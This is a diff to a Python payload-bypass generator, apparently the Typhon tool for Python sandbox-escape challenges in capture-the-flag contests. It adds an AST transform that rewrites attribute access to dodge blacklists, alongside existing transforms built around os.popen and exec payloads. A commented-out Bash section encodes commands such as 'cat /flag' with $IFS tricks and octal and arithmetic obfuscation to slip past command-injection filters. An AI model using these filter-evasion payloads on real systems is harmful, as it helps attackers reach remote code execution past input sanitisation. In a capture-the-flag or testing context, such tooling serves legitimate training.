@@ -187,7 +187,7 @@ class BypassGenerator:
         :param local_scope: tagged local scope
         """
         from .utils import find_object
-        
+
         self.find_object = find_object
         self.payload = payload[0]
         self.tags = payload[1]
@@ -253,7 +253,6 @@ class BypassGenerator:
             if not is_blacklisted(i):
                 return output  # in case of the challenge is easy
         if self._allow_after_tagging_bypassers:
-            
 
             output.append(self.numbers_to_binary_base(i))
             output.append(self.numbers_to_hex_base(i))
@@ -341,12 +340,11 @@ class BypassGenerator:
         ast.fix_missing_locations(new_tree)
         return unescape_double_backslash(ast.unparse(new_tree))
 
-    @general_bypasser
+    @bypasser_not_work_with(["transform_attribute_to_getattr_method"])
     def transform_attribute_to_getattr(self, payload: str) -> str:
         """
         'a.b' -> 'getattr(a, "b")'
         """
-        
 
         name = self.find_object(getattr, self.local_scope)
         if name is None:
@@ -392,7 +390,6 @@ class BypassGenerator:
         Returns:
             str: Transformed payload
         """
-        
 
         base_64_name = self.find_object(base64, self.local_scope)
         if base_64_name is None:
@@ -748,7 +745,6 @@ class BypassGenerator:
         """
         'a'+'b'+'c' -> chr(97)+chr(98)+chr(99)'
         """
-        
 
         name = self.find_object(chr, self.local_scope)
         if name is None:
@@ -820,7 +816,6 @@ class BypassGenerator:
         """
         'a'+'b'+'c' -> bytes([97])+bytes([98])+bytes([99])
         """
-        
 
         name = self.find_object(bytes, self.local_scope)
         if name is None:
@@ -915,7 +910,6 @@ class BypassGenerator:
         """
         'abc' -> bytes([97, 98, 99])
         """
-        
 
         name = self.find_object(bytes, self.local_scope)
         if name is None:
@@ -1058,7 +1052,6 @@ class BypassGenerator:
         wraps the payload with exec()
         __import__('os').system('ls') -> exec("__import__('os').popen('ls').read()")
         """
-        
 
         name = self.find_object(exec, self.local_scope)
         if name is None:
@@ -1082,7 +1075,6 @@ class BypassGenerator:
         """
         if ";" in payload or "\n" in payload:
             return payload
-        
 
         name = self.find_object(eval, self.local_scope)
         if name is None:
@@ -1102,7 +1094,6 @@ class BypassGenerator:
         """
         "".join([]) -> chr().join([])
         """
-        
 
         string_name = self.find_object(str, self.local_scope)
         if string_name is None:
@@ -1207,7 +1198,7 @@ class BypassGenerator:
         """
         'whoami' → list(dict(whoami=1))[0]
         """
-        
+
         from .Typhon import int_dict
 
         if int_dict == {}:
@@ -1283,6 +1274,7 @@ class BypassGenerator:
         str_name = self.find_object(str, self.local_scope)
         if str_name is None:
             return payload
+
         class Transformer(ast.NodeTransformer):
             def visit_Constant(self, node):
                 if isinstance(node.value, str) and node.value == "":
@@ -1297,3 +1289,127 @@ class BypassGenerator:
         new_tree = Transformer().visit(tree)
         ast.fix_missing_locations(new_tree)
         return ast.unparse(new_tree)
+
+    @bypasser_not_work_with(["transform_attribute_to_getattr"])
+    def transform_attribute_to_getattr_method(self, payload: str) -> str:
+        """
+        'a.b' -> 'a.__getattr__("b")'
+        """
+        tree = ast.parse(payload, mode="eval")
+
+        class Transformer(ast.NodeTransformer):
+            def visit_Attribute(self, node):
+                return ast.Call(
+                    func=ast.Attribute(
+                        value=self.visit(node.value), attr="__getattr__", ctx=ast.Load()
+                    ),
+                    args=[ast.Constant(value=node.attr)],
+                    keywords=[],
+                )
+
+        transformer = Transformer()
+        transformed_tree = transformer.visit(tree)
+        ast.fix_missing_locations(transformed_tree)
+        return ast.unparse(transformed_tree)
+
+
+# To be completed
+# class BashBypassGenerator:
+#     """
+#     Bypasser only for RCE bash commands.
+#     'cat /flag' -> 'cat$IFS$9/*'
+#     """
+#     def blank_to_ifs(self, payload: str) -> str:
+#         """
+#         '' -> $IFS$9
+#         """
+#         return payload.replace(" ", "$IFS$9")
+
+#     # the below are modified from program bashfuck
+#     # https://github.com/ProbiusOfficial/bashFuck
+#     # Copyright @ ProbiusOfficial, 2025
+
+#     def get_oct(self, c):  # 将字符的ASCII值转换为二进制字符串，然后将其转换为八进制，去掉前缀“0o”
+#         return (oct(ord(c)))[2:]
+
+
+#     # def nomal_otc(cmd):  # 注意,该方法无法执行带参数命令,如:ls -l
+#     #     payload = '$\''
+#     #     for c in cmd:
+#     #         payload += '\\' + get_oct(c)
+#     #     payload += '\''
+#     #     return info(payload)
+
+#     def common_otc(self, cmd):
+#         payload = '$\''
+#         for c in cmd:
+#             if c == ' ':
+#                 payload += '\' $\''
+#             else:
+#                 payload += '\\' + self.get_oct(c)
+#         payload += '\''
+#         return payload
+
+
+#     def bashfuck_x(self, cmd, form):
+#         bash_str = ''
+#         for c in cmd:
+#             bash_str += f'\\\\$(($((1<<1))#{bin(int(self.get_oct(c)))[2:]}))'
+#         payload_bit = bash_str
+#         payload_zero = bash_str.replace('1', '${##}')  # 用 ${##} 来替换 1
+#         payload_c = bash_str.replace('1', '${##}').replace('0', '${#}')  # 用 ${#} 来替换 0
+#         if form == 'bit':
+#             payload_bit = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_bit + '\\\''
+#             return payload_bit
+#         elif form == 'zero':
+#             payload_zero = '$0<<<$0\\<\\<\\<\\$\\\'' + payload_zero + '\\\''
+#             return payload_zero
+#         elif form == 'c':
+#             payload_c = '${!#}<<<${!#}\\<\\<\\<\\$\\\'' + payload_c + '\\\''
+#             return payload_c
+
+
+#     def bashfuck_y(self, cmd):
+#         oct_list = [  # 构造数字 0-7 以便于后续八进制形式的构造
+#             '$(())',  # 0
+#             '$((~$(($((~$(())))$((~$(())))))))',  # 1
+#             '$((~$(($((~$(())))$((~$(())))$((~$(())))))))',  # 2
+#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 3
+#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 4
+#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 5
+#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 6
+#             '$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))',  # 7
+#         ]
+#         bashFuck = ''
+#         bashFuck += '__=$(())'  # set __ to 0
+#         bashFuck += '&&'  # splicing
+#         bashFuck += '${!__}<<<${!__}\\<\\<\\<\\$\\\''  # got 'sh'
+
+#         for c in cmd:
+#             bashFuck += '\\\\'
+#             for i in self.get_oct(c):
+#                 bashFuck += oct_list[int(i)]
+
+#         bashFuck += '\\\''
+
+#         return bashFuck
+
+
+#     def Generate(self, cmd):
+#         print("Command: " + cmd)
+#         print("Payload generated as follows:")
+#         print(self.common_otc(cmd))
+#         print(self.bashfuck_x(cmd, 'bit'))
+#         print(self.bashfuck_x(cmd, 'zero'))
+#         print(self.bashfuck_x(cmd, 'c'))
+#         print(self.bashfuck_y(cmd))
+
+
+#     def main():
+#         print("This program is used to generate Payload for Bash to execute the given command. The program uses Bash's arithmetic and parameter extension capabilities to generate different forms of Payload to improve the chance of Bypass.")
+#         print("Author: Github@Probius_Official")
+#         cmd = input("input your command:")
+#         self.Generate(cmd)
+
+#     if __name__ == '__main__':
+#         main()
